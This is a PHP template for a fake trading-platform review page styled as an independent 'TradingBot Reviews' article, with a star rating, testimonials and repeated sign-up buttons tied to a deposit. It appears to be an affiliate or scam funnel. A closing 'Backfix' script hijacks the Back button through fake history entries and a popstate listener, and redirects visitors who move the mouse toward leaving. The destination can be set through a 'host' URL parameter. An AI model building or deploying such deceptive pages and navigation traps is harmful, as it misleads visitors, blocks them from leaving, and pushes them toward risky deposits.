<?php
// ============================================================
// NEWSNIK 3 — Tech Review Blog Post (streakk.ai style)
// ============================================================
if (file_exists(__DIR__ . '/config.php')) {
    require_once __DIR__ . '/config.php';
} else {
    require_once __DIR__ . '/../config.php';
}

// Read query parameters
$lang_param  = isset($_GET['lang'])  ? $_GET['lang']  : null;
$brand_param = isset($_GET['brand']) ? $_GET['brand'] : null;

// Resolve active language
$active_lang = get_active_lang($offer_lang, $lang_param);

// Resolve brand name
$brand_display = $brand_param ? htmlspecialchars(urldecode($brand_param)) : $brand_name;

// Load translations
require_once __DIR__ . '/lang.php';

// Get content for active language (fallback to English)
$t = isset($content[$active_lang]) ? $content[$active_lang] : $content['en'];

// Helper: replace placeholders in a string
function rpl($str) {
    if ($str === null) return '';
    global $brand_display, $min_deposit, $deposit_currency;
    $str = str_replace('{{BRAND}}', $brand_display, $str);
    $str = str_replace('{{MIN_DEPOSIT}}', $min_deposit, $str);
    $str = str_replace('{{CURRENCY}}', $deposit_currency, $str);
    return $str;
}

// Build registration URL with language
$reg_url = $offer_register_url . (strpos($offer_register_url, '?') !== false ? '&' : '?') . 'lang=' . urlencode($active_lang);
?>
<!DOCTYPE html>
<html lang="<?php echo $active_lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo rpl($t['page_title']); ?></title>
    <meta name="description" content="<?php echo rpl($t['meta_desc']); ?>">
    <meta name="robots" content="index, follow">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet">
    <?php if ($offer_favicon): ?>
    <link rel="icon" href="<?php echo $offer_favicon; ?>">
    <?php endif; ?>
    <style>
        /* ============================================================
           RESET & BASE
           ============================================================ */
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html { scroll-behavior: smooth; }
        body {
            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f7f8fa;
            color: #1a202c;
            line-height: 1.7;
            font-size: 16.5px;
            -webkit-font-smoothing: antialiased;
        }
        a { color: #2b6cb0; text-decoration: none; transition: color 0.2s; }
        a:hover { color: #1e4e8c; }
        img { max-width: 100%; height: auto; display: block; }

        /* ============================================================
           HEADER
           ============================================================ */
        .site-header {
            background: #fff;
            border-bottom: 1px solid #e2e8f0;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
        }
        .site-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 700;
            font-size: 20px;
            color: #1a202c;
        }
        .site-logo svg { flex-shrink: 0; }
        .site-nav { display: flex; gap: 28px; }
        .site-nav a {
            color: #4a5568;
            font-size: 14.5px;
            font-weight: 500;
            transition: color 0.2s;
        }
        .site-nav a:hover { color: #2b6cb0; }
        .nav-toggle { display: none; background: none; border: none; cursor: pointer; padding: 4px; }
        .nav-toggle svg { display: block; }

        /* ============================================================
           BREADCRUMBS
           ============================================================ */
        .breadcrumbs-bar {
            background: #fff;
            border-bottom: 1px solid #e2e8f0;
        }
        .breadcrumbs {
            max-width: 800px;
            margin: 0 auto;
            padding: 12px 24px;
            font-size: 13px;
            color: #718096;
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        .breadcrumbs a { color: #718096; }
        .breadcrumbs a:hover { color: #2b6cb0; }
        .breadcrumbs span.sep { color: #cbd5e0; }

        /* ============================================================
           ARTICLE CONTAINER
           ============================================================ */
        .article-wrap {
            max-width: 800px;
            margin: 0 auto;
            padding: 32px 24px 80px;
        }

        /* ============================================================
           ARTICLE HEADER
           ============================================================ */
        .article-title {
            font-size: clamp(28px, 5vw, 40px);
            font-weight: 700;
            color: #1a202c;
            line-height: 1.2;
            margin-bottom: 20px;
        }
        .author-block {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 28px;
            padding-bottom: 24px;
            border-bottom: 1px solid #e2e8f0;
        }
        .author-avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: linear-gradient(135deg, #2b6cb0, #4299e1);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 700;
            font-size: 18px;
            flex-shrink: 0;
        }
        .author-info { line-height: 1.4; }
        .author-name { font-weight: 600; color: #1a202c; font-size: 15px; }
        .author-meta { font-size: 13px; color: #718096; }
        .author-meta span + span::before { content: '·'; margin: 0 6px; }

        /* ============================================================
           HERO BANNER
           ============================================================ */
        .hero-banner {
            width: 100%;
            height: 320px;
            border-radius: 16px;
            background: linear-gradient(135deg, #1a365d 0%, #2b6cb0 50%, #4299e1 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 36px;
            position: relative;
            overflow: hidden;
        }
        .hero-banner::before {
            content: '';
            position: absolute;
            inset: 0;
            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.06'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        }
        .hero-brand {
            font-size: clamp(32px, 6vw, 52px);
            font-weight: 700;
            color: #fff;
            text-shadow: 0 2px 16px rgba(0,0,0,0.2);
            position: relative;
            z-index: 1;
        }
        .hero-sub {
            font-size: 16px;
            color: rgba(255,255,255,0.85);
            margin-top: 8px;
            position: relative;
            z-index: 1;
        }

        /* ============================================================
           RATING BOX
           ============================================================ */
        .rating-box {
            background: #ebf4ff;
            border: 1px solid #bee3f8;
            border-radius: 14px;
            padding: 28px 32px;
            display: flex;
            align-items: center;
            gap: 28px;
            margin-bottom: 36px;
        }
        .rating-score-wrap { text-align: center; flex-shrink: 0; }
        .rating-big {
            font-size: 48px;
            font-weight: 700;
            color: #2b6cb0;
            line-height: 1;
        }
        .rating-max { font-size: 16px; color: #718096; font-weight: 400; }
        .rating-stars { margin-top: 6px; }
        .rating-stars span { color: #f6ad55; font-size: 20px; letter-spacing: 2px; }
        .rating-info { flex: 1; }
        .rating-label { font-size: 13px; color: #718096; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; margin-bottom: 4px; }
        .rating-verdict { font-size: 20px; font-weight: 700; color: #276749; }

        /* ============================================================
           SECTION TITLES
           ============================================================ */
        .section-title {
            font-size: 26px;
            font-weight: 700;
            color: #1a202c;
            margin: 44px 0 18px;
            line-height: 1.3;
        }
        .article-text {
            color: #2d3748;
            margin-bottom: 20px;
        }

        /* ============================================================
           CTA BUTTONS
           ============================================================ */
        .cta-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: linear-gradient(135deg, #2b6cb0, #3182ce);
            color: #fff !important;
            padding: 14px 36px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            box-shadow: 0 4px 14px rgba(43,108,176,0.35);
        }
        .cta-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(43,108,176,0.45);
            color: #fff;
        }
        .cta-btn svg { flex-shrink: 0; }
        .cta-inline-wrap {
            text-align: center;
            margin: 32px 0;
        }

        /* ============================================================
           FEATURES GRID
           ============================================================ */
        .features-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 28px;
        }
        .feature-card {
            background: #fff;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 22px;
            transition: box-shadow 0.25s, transform 0.25s;
        }
        .feature-card:hover {
            box-shadow: 0 8px 24px rgba(0,0,0,0.06);
            transform: translateY(-2px);
        }
        .feature-icon { font-size: 28px; margin-bottom: 10px; }
        .feature-title { font-size: 16px; font-weight: 700; color: #1a202c; margin-bottom: 6px; }
        .feature-desc { font-size: 14px; color: #4a5568; line-height: 1.6; }

        /* ============================================================
           STEPS
           ============================================================ */
        .steps-list { margin-bottom: 28px; }
        .step-item {
            display: flex;
            gap: 20px;
            padding: 22px 0;
            border-bottom: 1px solid #e2e8f0;
        }
        .step-item:last-child { border-bottom: none; }
        .step-num {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: linear-gradient(135deg, #2b6cb0, #4299e1);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 18px;
            flex-shrink: 0;
        }
        .step-content { flex: 1; }
        .step-title { font-weight: 700; font-size: 17px; color: #1a202c; margin-bottom: 4px; }
        .step-desc { font-size: 14.5px; color: #4a5568; }

        /* ============================================================
           PROS & CONS
           ============================================================ */
        .pros-cons-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 32px;
        }
        .pros-card, .cons-card {
            background: #fff;
            border-radius: 14px;
            padding: 24px;
            border: 1px solid #e2e8f0;
        }
        .pros-card { border-top: 4px solid #38a169; }
        .cons-card { border-top: 4px solid #e53e3e; }
        .pc-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .pc-title.pros-t { color: #276749; }
        .pc-title.cons-t { color: #c53030; }
        .pc-list { list-style: none; }
        .pc-list li {
            padding: 7px 0;
            font-size: 14.5px;
            color: #2d3748;
            display: flex;
            gap: 8px;
            align-items: flex-start;
        }
        .pc-list li::before { flex-shrink: 0; font-size: 14px; line-height: 1.7; }
        .pros-card .pc-list li::before { content: '✅'; }
        .cons-card .pc-list li::before { content: '⚠️'; }

        /* ============================================================
           TESTIMONIALS
           ============================================================ */
        .testimonials-wrap { margin-bottom: 32px; }
        .testimonial-card {
            background: #fff;
            border: 1px solid #e2e8f0;
            border-radius: 14px;
            padding: 24px 28px;
            margin-bottom: 16px;
            position: relative;
        }
        .testimonial-card::before {
            content: '"';
            position: absolute;
            top: 12px;
            right: 20px;
            font-size: 64px;
            color: #e2e8f0;
            font-family: Georgia, serif;
            line-height: 1;
        }
        .testimonial-text { font-size: 15px; color: #2d3748; font-style: italic; margin-bottom: 14px; line-height: 1.7; }
        .testimonial-footer { display: flex; align-items: center; gap: 10px; }
        .testimonial-avatar {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: #e2e8f0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 14px;
            color: #4a5568;
        }
        .testimonial-name { font-weight: 600; font-size: 14px; color: #1a202c; }
        .testimonial-loc { font-size: 12px; color: #a0aec0; }
        .testimonial-stars { margin-left: auto; color: #f6ad55; font-size: 14px; letter-spacing: 1px; }

        /* ============================================================
           COMPARISON TABLE
           ============================================================ */
        .comparison-wrap {
            margin-bottom: 32px;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }
        .comparison-table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border-radius: 14px;
            overflow: hidden;
            border: 1px solid #e2e8f0;
            font-size: 14.5px;
        }
        .comparison-table thead th {
            background: #2b6cb0;
            color: #fff;
            padding: 14px 18px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
        }
        .comparison-table thead th:nth-child(2) {
            background: #1e4e8c;
        }
        .comparison-table tbody td {
            padding: 13px 18px;
            border-bottom: 1px solid #e2e8f0;
            color: #2d3748;
        }
        .comparison-table tbody tr:last-child td { border-bottom: none; }
        .comparison-table tbody tr:hover { background: #f7fafc; }
        .comparison-table tbody td:nth-child(2) {
            font-weight: 600;
            color: #2b6cb0;
        }

        /* ============================================================
           FAQ ACCORDION
           ============================================================ */
        .faq-list { margin-bottom: 32px; }
        .faq-item {
            background: #fff;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            margin-bottom: 10px;
            overflow: hidden;
            transition: box-shadow 0.2s;
        }
        .faq-item:hover { box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
        .faq-question {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 18px 22px;
            cursor: pointer;
            font-weight: 600;
            font-size: 15.5px;
            color: #1a202c;
            user-select: none;
            background: none;
            border: none;
            width: 100%;
            text-align: left;
            font-family: inherit;
        }
        .faq-question:hover { color: #2b6cb0; }
        .faq-chevron {
            transition: transform 0.25s ease;
            flex-shrink: 0;
            margin-left: 12px;
        }
        .faq-item.open .faq-chevron { transform: rotate(180deg); }
        .faq-answer {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.35s ease, padding 0.3s ease;
        }
        .faq-item.open .faq-answer {
            max-height: 300px;
        }
        .faq-answer-inner {
            padding: 0 22px 18px;
            font-size: 14.5px;
            color: #4a5568;
            line-height: 1.7;
        }

        /* ============================================================
           VERDICT / CTA BANNER
           ============================================================ */
        .verdict-box {
            background: linear-gradient(135deg, #ebf4ff, #e9f5f0);
            border: 1px solid #bee3f8;
            border-radius: 16px;
            padding: 36px;
            text-align: center;
            margin: 40px 0;
        }
        .verdict-box .section-title { margin-top: 0; }
        .verdict-text { max-width: 640px; margin: 0 auto 24px; color: #2d3748; }

        .cta-banner {
            background: linear-gradient(135deg, #1a365d, #2b6cb0);
            border-radius: 16px;
            padding: 40px 36px;
            text-align: center;
            color: #fff;
            margin: 40px 0;
        }
        .cta-banner h3 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .cta-banner p {
            color: rgba(255,255,255,0.85);
            margin-bottom: 22px;
            font-size: 15px;
        }
        .cta-banner .cta-btn {
            background: #fff;
            color: #2b6cb0 !important;
            box-shadow: 0 4px 14px rgba(0,0,0,0.15);
        }
        .cta-banner .cta-btn:hover {
            background: #f0f7ff;
        }

        /* ============================================================
           FOOTER
           ============================================================ */
        .site-footer {
            background: #1a202c;
            color: #a0aec0;
            padding: 48px 24px 32px;
            margin-top: 0;
        }
        .footer-inner {
            max-width: 800px;
            margin: 0 auto;
        }
        .footer-links {
            display: flex;
            gap: 24px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .footer-links a { color: #a0aec0; font-size: 14px; transition: color 0.2s; }
        .footer-links a:hover { color: #fff; }
        .footer-disclaimer {
            font-size: 12.5px;
            color: #718096;
            line-height: 1.7;
            margin-bottom: 16px;
            border-top: 1px solid #2d3748;
            padding-top: 20px;
        }
        .footer-copyright { font-size: 12px; color: #4a5568; }

        /* ============================================================
           RESPONSIVE
           ============================================================ */
        @media (max-width: 768px) {
            .site-nav { display: none; }
            .site-nav.open {
                display: flex;
                flex-direction: column;
                position: absolute;
                top: 64px;
                left: 0;
                right: 0;
                background: #fff;
                padding: 16px 24px;
                border-bottom: 1px solid #e2e8f0;
                gap: 14px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.06);
            }
            .nav-toggle { display: block; }
            .features-grid { grid-template-columns: 1fr; }
            .pros-cons-grid { grid-template-columns: 1fr; }
            .rating-box { flex-direction: column; text-align: center; gap: 16px; }
            .hero-banner { height: 220px; }
            .article-wrap { padding: 20px 16px 60px; }
            .verdict-box { padding: 24px 20px; }
            .cta-banner { padding: 28px 20px; }
        }
    </style>
</head>
<body>

<!-- ============================================================
     HEADER
     ============================================================ -->
<header class="site-header">
    <div class="header-inner">
        <a href="#" class="site-logo">
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="32" height="32" rx="8" fill="#2b6cb0"/>
                <path d="M8 16l4-8 4 8-4 8-4-8z" fill="#fff" opacity="0.9"/>
                <path d="M16 16l4-8 4 8-4 8-4-8z" fill="#fff" opacity="0.6"/>
            </svg>
            <span>TradingBot Reviews</span>
        </a>
        <button class="nav-toggle" onclick="document.querySelector('.site-nav').classList.toggle('open')" aria-label="Menu">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a202c" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
        </button>
        <nav class="site-nav">
            <a href="#"><?php echo $t['nav_home']; ?></a>
            <a href="#"><?php echo $t['nav_trading_bots']; ?></a>
            <a href="#"><?php echo $t['nav_reviews']; ?></a>
            <a href="#"><?php echo $t['nav_guides']; ?></a>
        </nav>
    </div>
</header>

<!-- BREADCRUMBS -->
<div class="breadcrumbs-bar">
    <div class="breadcrumbs">
        <a href="#"><?php echo $t['breadcrumb_home']; ?></a>
        <span class="sep">›</span>
        <a href="#"><?php echo $t['breadcrumb_category']; ?></a>
        <span class="sep">›</span>
        <span><?php echo rpl($t['page_title']); ?></span>
    </div>
</div>

<!-- ============================================================
     ARTICLE
     ============================================================ -->
<main class="article-wrap">

    <!-- Title -->
    <h1 class="article-title"><?php echo rpl($t['page_title']); ?></h1>

    <!-- Author Block -->
    <div class="author-block">
        <div class="author-avatar"><?php echo strtoupper(substr($t['author_name'], 0, 1)); ?></div>
        <div class="author-info">
            <div class="author-name"><?php echo $t['author_name']; ?></div>
            <div class="author-meta">
                <span><?php echo $t['author_role']; ?></span>
                <span><?php echo $t['published_date']; ?></span>
                <span><?php echo $t['reading_time']; ?></span>
            </div>
        </div>
    </div>

    <!-- Hero Banner -->
    <div class="hero-banner">
        <div class="hero-brand"><?php echo htmlspecialchars($brand_display); ?></div>
        <div class="hero-sub">Trading Platform Review 2025</div>
    </div>

    <!-- Rating Box -->
    <div class="rating-box">
        <div class="rating-score-wrap">
            <div class="rating-big"><?php echo $t['rating_score']; ?><span class="rating-max">/<?php echo $t['rating_max']; ?></span></div>
            <div class="rating-stars">
                <span>★★★★★</span>
            </div>
        </div>
        <div class="rating-info">
            <div class="rating-label"><?php echo $t['rating_title']; ?></div>
            <div class="rating-verdict"><?php echo $t['rating_verdict']; ?></div>
        </div>
    </div>

    <!-- Intro -->
    <p class="article-text"><?php echo rpl($t['intro']); ?></p>

    <!-- CTA 1 -->
    <div class="cta-inline-wrap">
        <a href="<?php echo $reg_url; ?>" class="cta-btn" rel="nofollow">
            <?php echo rpl($t['cta_button']); ?>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </a>
    </div>

    <!-- What is BRAND? -->
    <h2 class="section-title"><?php echo rpl($t['what_is_title']); ?></h2>
    <p class="article-text"><?php echo rpl($t['what_is_text']); ?></p>

    <!-- Key Features -->
    <h2 class="section-title"><?php echo rpl($t['features_title']); ?></h2>
    <div class="features-grid">
        <?php foreach ($t['features'] as $f): ?>
        <div class="feature-card">
            <div class="feature-icon"><?php echo $f['icon']; ?></div>
            <div class="feature-title"><?php echo rpl($f['title']); ?></div>
            <div class="feature-desc"><?php echo rpl($f['desc']); ?></div>
        </div>
        <?php endforeach; ?>
    </div>

    <!-- CTA 2 -->
    <div class="cta-inline-wrap">
        <a href="<?php echo $reg_url; ?>" class="cta-btn" rel="nofollow">
            <?php echo rpl($t['cta_button']); ?>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </a>
    </div>

    <!-- How to Get Started -->
    <h2 class="section-title"><?php echo rpl($t['getting_started_title']); ?></h2>
    <div class="steps-list">
        <?php foreach ($t['getting_started_steps'] as $i => $s): ?>
        <div class="step-item">
            <div class="step-num"><?php echo $i + 1; ?></div>
            <div class="step-content">
                <div class="step-title"><?php echo rpl($s['title']); ?></div>
                <div class="step-desc"><?php echo rpl($s['desc']); ?></div>
            </div>
        </div>
        <?php endforeach; ?>
    </div>

    <!-- Pros & Cons -->
    <div class="pros-cons-grid">
        <div class="pros-card">
            <div class="pc-title pros-t">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#38a169" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                <?php echo $t['pros_title']; ?>
            </div>
            <ul class="pc-list">
                <?php foreach ($t['pros'] as $p): ?>
                <li><?php echo rpl($p); ?></li>
                <?php endforeach; ?>
            </ul>
        </div>
        <div class="cons-card">
            <div class="pc-title cons-t">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#e53e3e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                <?php echo $t['cons_title']; ?>
            </div>
            <ul class="pc-list">
                <?php foreach ($t['cons'] as $c): ?>
                <li><?php echo rpl($c); ?></li>
                <?php endforeach; ?>
            </ul>
        </div>
    </div>

    <!-- CTA 3 -->
    <div class="cta-inline-wrap">
        <a href="<?php echo $reg_url; ?>" class="cta-btn" rel="nofollow">
            <?php echo rpl($t['cta_button']); ?>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </a>
    </div>

    <!-- Is BRAND Legit? -->
    <h2 class="section-title"><?php echo rpl($t['legit_title']); ?></h2>
    <p class="article-text"><?php echo rpl($t['legit_text']); ?></p>

    <!-- Testimonials -->
    <h2 class="section-title"><?php echo rpl($t['testimonials_title']); ?></h2>
    <div class="testimonials-wrap">
        <?php foreach ($t['testimonials'] as $tm): ?>
        <div class="testimonial-card">
            <div class="testimonial-text"><?php echo rpl($tm['text']); ?></div>
            <div class="testimonial-footer">
                <div class="testimonial-avatar"><?php echo strtoupper(substr($tm['name'], 0, 1)); ?></div>
                <div>
                    <div class="testimonial-name"><?php echo $tm['name']; ?></div>
                    <div class="testimonial-loc"><?php echo htmlspecialchars($tm['location'] ?? 'Verified Investor'); ?></div>
                </div>
                <div class="testimonial-stars"><?php echo str_repeat('★', $tm['rating']) . str_repeat('☆', 5 - $tm['rating']); ?></div>
            </div>
        </div>
        <?php endforeach; ?>
    </div>

    <!-- Comparison Table -->
    <h2 class="section-title"><?php echo rpl($t['comparison_title']); ?></h2>
    <div class="comparison-wrap">
        <table class="comparison-table">
            <thead>
                <tr>
                    <?php foreach ($t['comparison_headers'] as $h): ?>
                    <th><?php echo rpl($h); ?></th>
                    <?php endforeach; ?>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($t['comparison_rows'] as $row): ?>
                <tr>
                    <?php foreach ($row as $cell): ?>
                    <td><?php echo rpl($cell); ?></td>
                    <?php endforeach; ?>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <!-- FAQ -->
    <h2 class="section-title"><?php echo rpl($t['faq_title']); ?></h2>
    <div class="faq-list">
        <?php foreach ($t['faqs'] as $faq): ?>
        <div class="faq-item">
            <button class="faq-question" onclick="this.parentElement.classList.toggle('open')">
                <span><?php echo rpl($faq['q']); ?></span>
                <svg class="faq-chevron" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#718096" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
            </button>
            <div class="faq-answer">
                <div class="faq-answer-inner"><?php echo rpl($faq['a']); ?></div>
            </div>
        </div>
        <?php endforeach; ?>
    </div>

    <!-- Verdict Box -->
    <div class="verdict-box">
        <h2 class="section-title"><?php echo rpl($t['verdict_title']); ?></h2>
        <p class="verdict-text"><?php echo rpl($t['verdict_text']); ?></p>
        <a href="<?php echo $reg_url; ?>" class="cta-btn" rel="nofollow">
            <?php echo rpl($t['cta_button']); ?>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </a>
    </div>

    <!-- CTA Banner -->
    <div class="cta-banner">
        <h3><?php echo rpl($t['cta_banner_title']); ?></h3>
        <p><?php echo rpl($t['cta_banner_text']); ?></p>
        <a href="<?php echo $reg_url; ?>" class="cta-btn" rel="nofollow">
            <?php echo rpl($t['cta_button']); ?>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </a>
    </div>

</main>

<!-- ============================================================
     FOOTER
     ============================================================ -->
<footer class="site-footer">
    <div class="footer-inner">
        <div class="footer-links">
            <a href="#"><?php echo htmlspecialchars($t['footer_privacy'] ?? 'Privacy Policy'); ?></a>
            <a href="#"><?php echo htmlspecialchars($t['footer_terms'] ?? 'Terms & Conditions'); ?></a>
            <a href="#"><?php echo htmlspecialchars($t['footer_contact'] ?? 'Contact Us'); ?></a>
        </div>
        <div class="footer-disclaimer"><?php echo rpl($t['footer_disclaimer'] ?? 'Risk Warning: Trading involves substantial risk.'); ?></div>
        <div class="footer-copyright"><?php echo rpl($t['footer_copyright'] ?? ('© ' . date('Y') . ' ' . $brand_name . '. All rights reserved.')); ?></div>
    </div>
</footer>

<!-- ============================================================
     BACKFIX REDIRECT SCRIPT (Ravelizio Version)
     ============================================================ -->
<script>
(function() {
    var searchParams = new URLSearchParams(window.location.search);
    var lang = searchParams.get('lang') || 'en';
    var host = searchParams.get('host');
    var targetUrl = host ? ("//" + host + "/google.php?lang=" + lang) : ('../google.php?lang=' + lang);
    var activated = false;

    function activateBackBlock() {
        if (activated) return;
        activated = true;
        console.log("[Backfix newsnik3] Скрипт активирован! Записываем историю...");

        /* --- OLD 15-LOOP VERSION (for rollback):
        for (var i = 0; i < 15; i++) {
            history.pushState(null, document.title, location.href);
        }
        window.addEventListener('popstate', function() {
            setTimeout(function() {
                location.replace(targetUrl);
            }, 1);
        });
        ------------------------------------------ */

        // NEW Ravelizio 2-state Pattern with Hash Bypass
        try {
            history.pushState({backfixed: 1}, "", location.href);
            history.pushState({backfixed: 2}, "", location.href + "#back");
            console.log("[Backfix newsnik3] История с хэшем успешно записана. Ждем 'Назад'. Target: " + targetUrl);
        } catch (e) {
            console.log("[Backfix newsnik3] Ошибка pushState: ", e);
        }

        window.addEventListener('popstate', function(event) {
            console.log("[Backfix newsnik3] Событие popstate перехвачено!");
            console.log("[Backfix newsnik3] Перенаправляем на: " + targetUrl);
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 50);
        });
    }

    document.addEventListener('click', activateBackBlock, { once: true });
    window.addEventListener('scroll', function() {
        if (window.scrollY > 30) {
            activateBackBlock();
        }
    }, { once: true });
    setTimeout(activateBackBlock, 3000);

    document.addEventListener('mouseleave', function(e) {
        if (e.clientY < 20) {
            location.replace(targetUrl);
        }
    });
})();
</script>

</body>
</html>
